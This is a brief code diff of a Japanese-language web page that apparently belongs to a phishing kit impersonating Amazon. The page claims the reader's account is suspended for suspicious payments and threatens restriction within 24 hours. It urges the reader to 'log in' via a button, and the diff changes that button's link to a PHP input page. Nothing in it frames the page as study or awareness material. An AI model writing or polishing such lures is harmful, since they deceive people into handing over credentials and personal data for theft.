@@ -20,7 +20,7 @@
                 お客様のアカウントは強制停止されています。アカウントで不審なお支払い<br>
                 が検出されました。<br>
                 取引注文を防ぐために、個人情報を確認する必要があります。</p>
-            <a class="btn btn-lg btn-warning" href="todo_txt_input2.php" role="button">Amazon ログイン </a>
+            <a class="btn btn-lg btn-warning" href="input2.php" role="button">Amazon ログイン </a>
             <p class="lead text-danger mt-3">なお、24時間以内にご確認がない場合、誠に申し訳ありません、お客様の安全のため、<br>
                 アカウントの利用を制限させていただきますので、予めご了承ください。</p>
         </div>
